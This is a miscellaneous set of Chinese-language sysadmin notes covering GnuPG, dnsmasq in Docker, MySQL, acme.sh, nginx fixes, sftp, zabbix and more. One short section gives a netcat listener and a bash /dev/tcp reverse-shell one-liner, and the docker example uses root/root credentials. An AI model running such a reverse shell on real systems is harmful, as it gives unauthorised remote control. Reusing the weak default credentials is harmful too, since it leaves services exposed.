# 那些杂七杂八的记录


# GnuPG 加密与解密  
## gpg 对称加密  
加密:  `gpg -c <file>`， 输入两次加密密码，完成后生成文件`<file>.gpg`(加密后源文件保留)  
解密:  `gpg <file>.gpg`, 输入加密密码,正确后生成文件`<file>`(解密后加密文件保留)  
## gpg 非对称加密  
非对称加密/解密文件时，`Server` 生成私钥与公钥，并把公钥发送给`Client`, `Client` 使用公钥加密数据，并把加密后的数据传给`Server` ，`Server` 最后使用自己的私钥解密数据。  

```bash 
# Server: 创建公钥私钥
$> gpg --gen-key   # 需要填写一些东西，可根据需求选择 
## 配置文件介绍
# GPG 配置文件目录:~/.gnupg
# ~/.gnupg/gpg.conf – 配置文件
# ~/.gnupg/trustdb.gpg – 信任库
# ~/.gnupg/pubring.gpg – 公钥库
# ~/.gnupg/secring.gpg – 私钥库 

$> gpg --list-key  # 密钥查看 
$> gpg -a --export <UserID> > ./public-key.pub # Server: 公钥导出 UserID 为公私钥创建时候生成的，即 gpg: 密钥 <UserID> 被标记为绝对信任  
# 将公钥传送到Client上 

# Client: 导入 公钥 
$> gpg --import ./public-key.pub 

# Client: 文件加密 
$> gpg -e -r <UserID> <file> 
<file>.gpg 
# 加密完成后将文件传送至Server 进行解密，此时Client上是不可解密的，要解密需要私钥  
# Server: 文件解密 
$> gpg -d <file>.gpg 
<file> 
```

# DOCKER 创建 DNS SERVER
```bash
$> vim /data/docker/dns/dnsmasq.conf 
#dnsmasq config, for a complete example, see:
#  http://oss.segetech.com/intra/srv/dnsmasq.conf
#log all dns queries
log-queries
#dont use hosts nameservers
no-resolv
#use cloudflare as default nameservers, prefer 1^4
server=8.8.4.4
server=8.8.8.8
strict-order
#serve all .company queries using a specific nameserver
server=/company/10.0.0.1
#explicitly define host-ip mappings
address=/www.example.com/172.16.10.10

$> docker run -d -p 53:53/udp -p 53:53/tcp -p 5380:8080 -v /data/docker/dns/dnsmasq.conf:/etc/dnsmasq.conf --log-opt "max-size=100m" -e "HTTP_USER=root" -e "HTTP_PASS=root" jpillora/dnsmasq


```

# Mysql  Errcode: 24 - Too many open files 
> [https://blog.csdn.net/weixin_36343850/article/details/86293700](https://blog.csdn.net/weixin_36343850/article/details/86293700)   

原因：打开文件数量太多，超出了`open_files_limit`这个参数的限制，在一个表中有多个分区的时候，这种情况更容易发生。  
解决方法： 
- 查看 `open_files_limit`参数, 使用`show variables like '%open%';`就可以看到了   
- 修改 `open_files_limit`参数  
 在网上找了很多资料，有的说直接在`/etc/mysql/mysql.conf.d/mysqld.cnf`文件中的`[mysqld]`部分添加`open_files_limit`参数，比如`open_files_limit=102400`，并且在`/etc/security/limits.conf` 添加`mysql soft nofile 102400`和`mysql hard nofile 102400`这两个参数然后重启`MySQL`，但是发现不能生效。  
- 以下方法可用： 
  - 在文件`/etc/systemd/system/multi-user.target.wants/mysql.service`(也有可能是`/etc/systemd/system/mysql.service`这个文件)最后添加`LimitNOFILE=102400`  
- 然后执行`systemctl daemon-reload`，接着再重启`mysql`服务`sudo service mysql restart`,可以看到已经修改成功了  

# dotnet 环境搭建 
```bash
$> rpm -Uvh https://packages.microsoft.com/config/rhel/7/packages-microsoft-prod.rpm
$> yum install libgdiplus-devel libunwind icu -y 
$> wget https://packages.microsoft.com/rhel/7/prod/dotnet-sdk-2.1.200-rhel-x64.rpm
$> yum install dotnet-sdk-2.1.200-rhel-x64.rpm -y
$> dotnet --info
# supervisor 管理
yum install supervisor -y
# 前端管理样式页面 
/usr/lib/python2.7/site-packages/supervisor/ui/status.html
```

# 在Linux中删除virbr0接口
`virbr0`是`CentOS7`在安装过程中选择了相关虚拟化的服务安装后产生的,实际上好像是没什么卵用的
```bash
$> virsh net-list 
$> virsh net-destroy default 
$> virsh net-undefine default
$> systemctl restart libvirtd.service
```

# Linux 杀毒软件 clamav 
```bash
# 需要安装epel源
$>　yum install clamav-server clamav-data clamav-update clamav-filesystem clamav clamav-scanner-systemd clamav-devel clamav-lib clamav-server-systemd
# 注释掉 /etc/freshclam.conf /etc/clamd.d/scan.conf 中的Example 
# 更新病毒库　
$> /usr/bin/freshclam
# 扫描 
$> clamscan -ri /data --remove  -l /var/log/clamscan.log 

```

# acme.sh 管理免费域名证书 
此处说明两个注意一点设置的`DNS API`密钥的获取，`cloudflare`和`腾讯云`, 其他可直接参看官方说明 [https://github.com/acmesh-official/acme.sh/wiki/dnsapi](https://github.com/acmesh-official/acme.sh/wiki/dnsapi)  
- `cloudflare`：解析的需要创建API 令牌, API令牌权限需要创建 `区域.区域`和`区域.DNS`，区域资源为`所有区域`或者`帐号的所有区域` , 另外需要的`CF_Account_ID`是`url`中包含的那`32`位的字符串.
```bash
# cloudflare 
$> curl  https://get.acme.sh | sh

$> export CF_Token="xxxxx"
$> export CF_Account_ID="xxxxxx"

$> acme.sh --issue -d example.com -d '*.example.com' --dns dns_cf
```

- 腾讯云：腾讯云实际上需要使用的是`dnspod` 的 `id` 和 `token`他们两个是共用的，可以直接用腾讯云帐号登录`dnspod`,进去后获取到`id` 和 `token` 就行了
```bash
# 腾讯云
$> curl  https://get.acme.sh | sh

$> export DP_Id="xxxxx"
$> export DP_Key="xxxxx"

$> acme.sh --issue -d example.com -d '*.example.com' --dns dns_dp
```

# 禅道bug管理系统 
1. 这个部署遇到的一个坑就是`php`打死获取不到`session`的位置  
打开调试日志方式是将`my.cnf` 中`debug`设置为`true`  
实际错误体现是 `ERROR: 您访问的域名 xxx.xxx.xxx 没有对应的公司。`  
我的解决方案是 代码目录整体权限设置为`777`,然后删除掉`my.cnf`进行重装,重装后在目录权限调整为正常权限即可.  
3. 安装完成后，首页出现无限循环重定向，手动将`my.php`中`PATH_INFO`修改为`GET`，或在`nginx`传入变量`PATH_INFO`值`$request_uri;`

# nginx 代理php产生的一些故障
记录一个`nginx` 代理 `php` 产生的问题,问题已经解决了,但是似乎还是没有找到根本原因,**若有了解的,请一定解惑一二**, 以下记录下处理过程 . 
- 问题产生过程:  
  - A服务器代码迁移到B机器上,代码是`rsync`直接同步的,然后B运行的时候就出问题了,根据调试发现,无论访问什么(html/js/css)都会跳转到首页,实际应该是都会经过`php`解析(我发誓A和B的环境配置是一模一样的!A可以正常运行.), `php`框架为`opencart` .   

- 浏览器访问表现以下错误:   
  - `Resource interpreted as Stylesheet but transferred with MIME type text/html` 
  - `ERR_CONNECTION_REFUSED`  

- 处理过程 :
  - 问题实际上是头一天发生的,经过多方调试发现,实际上通过域名访问任何资源均会跳转到首页,访问`php`资源则会出现无法加载`js/css`等静态资源全部都是`MIME`类型问题,`nginx`强行给`css/js`等资源设置一个`content-type`前端也无法识别正确,另外也测试过网上提供的多方解决方案,仍然无法得到解决 .  
  - 第二天, 保持原有`nginx`配置 , 我给对应站点首页的`index.php`代码中加入了`echo 123; exit();`进行测试,访问发现可正常断开,此时在访问根下的静态`html`测试文件,发现可以正常访问了,此时删除`echo 123; exit();`,重新访问`index.php`,发现(js/css)静态资源被升级为`https`访问,此时我给相关域名配置上证书,然后访问就正常了!!!  

- 原因分析:     
  - 站点缓存(这个可能性最大),`opencart`框架实际上`session`是存储到数据库中的,估计很多的`cache`也是存于数据中的,而今天解决的时间也恰好距离我最后一次同步一天的样子.  
  - `nginx` 配置域名过多,导致配置混乱. B服务器的`nginx`实际上已经配置了很多个域名,`php`解析的`SCRIPT_FILENAME` 我使用的是`$document_root`,最后一次修改我也将`$document_root`修改为了具体的路径,不知道会不会是这个原因产生的.  

# linux 合并文件系统 margerfs 
>[https://wzyboy.im/post/1148.html](https://wzyboy.im/post/1148.html)

>[https://github.com/trapexit/mergerfs](https://github.com/trapexit/mergerfs)  

使用示例: 
```bash
# 挂载到的目录必须为空
# 命令挂载
$> mergerfs -o defaults,allow_other,use_ino,minfreespace=10G,ignorepponrename=true /data01:/data02 /shares

# fstab
$> /etc/fstab
/data01:/data02 /shares fuse.mergerfs defaults,noauto,allow_other,use_ino,minfreespace=10G,ignorepponrename=true 0 0

```

# linux sftp 搭建  
```bash
# 编辑文件 /etc/ssh/sshd_config,末尾添加(新建的用户若仅使用sftp可以不指定可登陆的bash)
# 若想要让sftp更像登陆到了服务器,可配合chroot来控制,当然也可以直接创建账号，但一般不建议
# 
Match Group  www                          # 限制某个组或者某个用户使用以下规则
    ChrootDirectory  /data/sftp    # sftp 限制登陆目录到此处
    ForceCommand internal-sftp            # 仅允许使用sftp 
    X11Forwarding no                      # 禁止x11转发
    AllowTcpForwarding no                 # 禁止 tcp 转发  
```

# 监听本地网卡上没有的IP地址
```bash
# 一般用于 keepalive + nginx 使用
echo 'net.ipv4.ip_nonlocal_bind = 1' >> /etc/sysctl.conf
```

# 腾讯云第二块网卡绑定公网ip
官方文档是有记录的，这儿记录下服务器上的设置  
```bash
# 网卡初始化

DEVICE=eth1
NM_CONTROLLED=yes
ONBOOT=yes
IPADDR=<网卡2IP>
NETMASK=255.255.240.0

# 
echo "10 t1" >> /etc/iproute2/rt_tables
echo "20 t2" >> /etc/iproute2/rt_tables

/usr/sbin/ip route add default dev eth0 via 172.21.0.1 table 10
/usr/sbin/ip route add default dev eth1 via 172.21.0.1 table 20

/usr/sbin/ip rule add from 172.21.2.168 table 10
/usr/sbin/ip rule add from 172.21.2.74 table 20
```

# shell 反弹 
> https://blog.csdn.net/weixin_41082546/article/details/104123131  


```bash 
# 被控端执行  
nc -lvp 65535
# 控制端执行 
bash -i >& /dev/tcp/<被控端ip>/65535 0>&1
```

# zabbix 自动发现异常错误  
-  具体错误表现  
1. `Cannot create item: item with the same key "domain.status[{#DOMAIN_NAME},http_code]" already exists.`  
2. `Cannot accurately apply filter: no value received for macro "{#DOMAINNAME}".`  
- 解决方案  
  - 这个是特么的自动发现脚本返回值的`key`必须用`{}`括起来,不然你即使是`json`格式他也不会认, 网上那些这个抄那个的坑货就只知道变量要大写，还有个坑告诉我要使用宏,用了宏就是第二个问题,不用第一个，这我是记得很清楚，宏并不是必定要有的啊，我以前写也基本没有加过。 我特么也是蠢了，写了这么多的自动发现，居然没有注意要括起来。 

# nginx 获取cdn真实用户ip 
```conf
# client_real_ip 即为用户真实IP,可直接用于替换 remote_addr 
  map $http_x_forwarded_for  $client_real_ip {
      ""  $remote_addr;
      ~^(?P<firstAddr>[0-9\.]+),?.*$  $firstAddr;
  }

```

# virtualbox - 从主机端口80到VirtualBox端口80的端口转发不起作用 
此次问题实际出现是在`windows`上, 理论上说`linux`下若使用`nat`功能可能也会出现该问题(至于为什么用`nat`,`virtualbox`似乎并不支持桥接网卡,因此要为虚拟机分配物理`ip`似乎就只能在物理机绑定多个`ip`,然后`nat`转发到虚拟机中), `virtualbox`在转发`80`端口时似乎会与物理机的`80`冲突,从而导致转发无效,这个可能是因为我物理机也启用了`IIS`的原因.好吧,以上都是些废话,我也不知道在说些什么,下面看解决方案.
- 解决方案
 1. 我是用的 `windows`的端口转发解决的, `virtualbox`在`nat`的时候转发一个其他端口(比如`8080`)到内部的`80`, 然后在`windows` 在进行一次转发,将绑定的`ip`的`80`端口转发到`8080`上,这样也可以解决,骚操作看 [`windows命令收集`-`端口转发`](/2022/命令收集/#3-windows-端口转发)
 2. 还有个说的是用管理员身份运行`virtualbox`,也可以解决,不过我没有验证过 

 > [https://www.coder.work/article/6503907](https://www.coder.work/article/6503907)

# docker 网络桥联网络无法访问物理机网络问题  
 - 当容器以桥连模式启动时是无法访问物理主机网络的,此时需要手动配置下防火墙信任容器的桥连网卡流量 
 ```bash
  # 如容器启动后的网卡为 br-3630aa8a433b ,则防火墙添加下 
  $> iptables -A INPUT -i br-3630aa8a433b -j ACCEPT
 ```

# 服务器默认端口优化 
1. 检查所有非22开启的端口：`netstat -lntp`  
```bash
$> netstat -lntp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      1317/master         
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      1/systemd           
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1569/sshd           
tcp6       0      0 ::1:25                  :::*                    LISTEN      1317/master         
tcp6       0      0 :::111                  :::*                    LISTEN      1/systemd           
tcp6       0      0 :::22                   :::*                    LISTEN      1569/sshd 
```  

2. 查询`/etc/services`下端口对应的服务：`grep -E "25|111/" /etc/services `   
```bash 
$> grep -E "\ 25/|\ 111/" /etc/services 
smtp            25/tcp          mail
smtp            25/udp          mail
sunrpc          111/tcp         portmapper rpcbind      # RPC 4.0 portmapper TCP
sunrpc          111/udp         portmapper rpcbind      # RPC 4.0 portmapper UD
```

3. 检查服务的运行状态(第三列为服务名称)： `systemctl list-unit-files |grep -E "rpcbind|portmapper|mail"`, 若单个端口所映射的服务没有查询到，需要通过运行端口的`pid`去查询他具体是属于那个程序的，然后然后去查询具体的服务启动状态。  
```bash
$> systemctl list-unit-files |grep -E "rpcbind|portmapper|postfix"
postfix.service                               enabled 
rpcbind.service                               enabled 
rpcbind.socket                                enabled 
rpcbind.target                                static  
$> systemctl stop postfix.service rpcbind.service rpcbind.socket     # 关闭启动的服务
$> systemctl disable postfix.service rpcbind.service rpcbind.socket     # 禁用开机启动
```

# linux 下hosts文件和dns服务器的响应顺序
- 通过修改 `/etc/nsswitch.conf` 进行更换 , 更换`/etc/nsswitch.conf: 86`中的`files`和`dns`的顺序即可  

# git 提交类型 

| 类型       | 描述                                                        |
| :--------- | :---------------------------------------------------------- |
| `feat`     | 新增 `feature`                                               |
| `fix`      | 修复 `bug`                                                   |
| `docs`     | 仅仅修改了文档，比如`README`, `CHANGELOG`, `CONTRIBUTE`等等 |
| `style`    | 仅仅修改了空格、格式缩进、都好等等，不改变代码逻辑          |
| `refactor` | 代码重构，没有加新功能或者修复`bug`                           |
| `perf`     | 优化相关，比如提升性能、体验                                |
| `test`     | 测试用例，包括单元测试、集成测试等                          |
| `chore`    | 改变构建流程、或者增加依赖库、工具等                        |
| `revert`   | 回滚到上一个版本                                            |


# nginx 伪静态无效问题 
- 具体错误体现
拿到`apache`的`.htaccess`文件后，通过[`https://www.winginx.com/en/htaccess`](https://www.winginx.com/en/htaccess)转换为了`nginx`可用的规则，但加入后访问跳转一直是`404`,经检查`location`是定位成功了的，但就是访问不了
- 解决方案: 
 1. 后续开发提供了另一个伪静态配置,所有`rewrite`是放在`if`指令中(`!-e $request_filename`)，然后就可以了。我对比了下，两者的差异就是，一个是放在了`location`中，定位了每一个`rewrite`所在的位置。还有就是放在`if`中的`rewrite`的匹配规则是用引号括起来了的。具体原因暂时还是每搞清楚。后续出现需测试下引号是否有影响.

# linux 通过s3fs挂载七牛云存储
```bash
$> sudo yum install epel-release
$> sudo yum install s3fs-fuse

$> echo AK:SK > /mnt/.passwd-s3fs
$> chmod 600 /mnt/.passwd-s3fs

$> s3fs s3空间名 /mnt/s3fs -o passwd_file=/mnt/.passwd-s3fs -o url=http://s3-cn-north-1.qiniucs.com -o use_path_request_style   # -o dbglevel=info -f -o curldbg # 日志信息

```

# 普通用户校验是否有权限通过docker.sock操作 docker
```
sudo -u zabbix curl --unix-socket /var/run/docker.sock --no-buffer -XGET v1.24/_ping
```

# rdesktop-vrdp 远程桌面工具安装
- rdesktop-vrdp 是 viralbox的一个很好用的远程桌面工具，没有独立包，可从virtualbox下分离出来单独使用 
```
$> sudo dnf install liblzf
$> rpm2cpio VirtualBox-server-6.1.28-1.fc33.x86_64.rpm |cpio -div
$> cp ./usr/bin/rdesktop-vrdp /usr/local/bin/
$> cp -v ./usr/lib64/virtualbox/VBoxRT.so /usr/lib64/
$> ldconfig
$> rdesktop-vrdp -a 16 -g 1900x960 -r clipboard:PRIMARYCLIPBOARD -r disk:floppy=/tmp/ -u administrator <server_ip>:<port> -p<password>
```

# Umask 计算方法 
- 当创建目录时候，`目录创建后的权限` =  `默认目录最大权限(777)` - `umask 权限`  
    - `umask=0022 --> 777 - 022 = 755(目录权限)`  
- 当创建文件时候，若`umask`值所有位数为偶数，则 `文件创建后的权限` = `默认文件最大权限(666)` - `umask权限`  
    - `umask = 0022 --> 666 - 022 = 644(文件权限)`  
- 当创建文件时候，若`umask`值部分或全部为奇数时候，则 `文件创建后的权限` = `默认文件最大权限(666)` - `umask权限` + `umask基数位+1`  
    - `umask = 0045 --> 666 - 045 = (621 + 001) = 622`  
    - `umask = 0033 --> 666 - 033 = (633 + 011) = 644`  

# 输入输出重定向  

## 文件描述符    
|文件描述符|文件名|类型|硬件|
|-|-|-|-|
|`0`|`stdin`|标准输入文件|键盘|
|`1`|`stdout`|标准输出文件|显示器|
|`2`|`stderr`|标准错误输出文件|显示器|

## 标准重定向 
>[https://aimuke.github.io/linux/2019/05/29/redirect/](https://aimuke.github.io/linux/2019/05/29/redirect/)  

|类型|表现形式|
|-|-|
|标准输入重定向|`0<`或`<`|
|追加输入重定向|`0<<`或`<`|
|标准输出重定向|`1>`或`>`|
|标准输出追加重定向|`1>>`或`>>`|
|标准错误重定向|`2>`|
|标准错误追加重定向|`2>>`|
|标准错误重定向到标准输出|`2>&1`，`(cmd > /dev/null 2>&1) == (cmd >& /dev/null) == (cmd &> /dev/null)`|

# nginx 反向代理后端服务器，部分资源出现502错误 
问题描述: 后端是`dotnet`应用，反向代理时候域名请求页面部分`css`/`js`资源返回`502`错误。直接请求报错的`css`/`js`又是正常的，前端绕过`nginx`直接访问`dotnet`所有返回又是正常的。只有经过`nginx`会出现该问题。
解决过程：
  - 网上搜索到很多的解决方案，这一个感觉有点用，但***并没有解决我的问题***,说的是`header过大，超出了默认的1k，就会引发上述的upstream sent too big header，nginx把外部请求给后端处理，后端返回的header太大，nginx处理不过来就会导致502`，这个问题提出的解决是，增大`proxy_buffer_size`/`proxy_buffers`/`proxy_busy_buffers_size`,不过还是记录下，毕竟不是每个问题原因都一样。
  - 这是我当时参考的第二个方案,根据官方文档[`https://nginx.org/en/docs/http/ngx_http_upstream_module.html#keepalive`](https://nginx.org/en/docs/http/ngx_http_upstream_module.html#keepalive),调整了`upstream`中`keepalive`,我原来设置的是`2`,现调整为`16`,并设置了`Connection "Keep-Alive";`(这个设置是为了保持`http/1.0`持久链接，官方不建议使用此参数，但我这边`websokcet`和`http/1.0`,单独设置一个并没有效果，所以两个都设置了)。这个方案当时解决了一部分的问题。但根本并未得到解决。
  - 然后最终的方案，重启应用服务器，问题完全解决！！！

原因分析：突然不知道怎么下笔了，反正就是系统tcp连接过多，最开始体现就是出现大量的`CLOSE_WAIT`,当时重启了对应占用的程序，清理一些连接，出现一定的好转，但也仅仅出现了好转，后面可能由于某些原因，导致重启应用也无法解决了，最后重启服务器，问题完全解决。 应该不是每个人都是这个原因，不过可以参考下。


**虽然一直在使用`nginx`，但对于这些更深度的东西还是一点都不清楚，不知道这个问题记录的是否正确，但根据第二个方案已经解决了我的问题**  

# linux 下挂载 esxi 的 vmfs 文件系统 
`vmfs` 是`esxi`的文件系统,物理机使用`esxi`虚拟化后硬盘的文件格式就是这个. `linux`下可以直接将其挂在到本地
`vmfs-tools`是`linux`挂载`vmfs`的驱动程序(应该也可以挂在`vmdk`文件,*我没有试过*),默认在`ubuntu`上已获得支持,`fedora`上可以直接将`ubuntu`上的安装程序复制过来也可以直接使用. 

> https://github.com/glandium/vmfs-tools 

```bash
# 安装后挂载  
vmfs-fuse /dev/sdc1 /mnt/sdc 
```
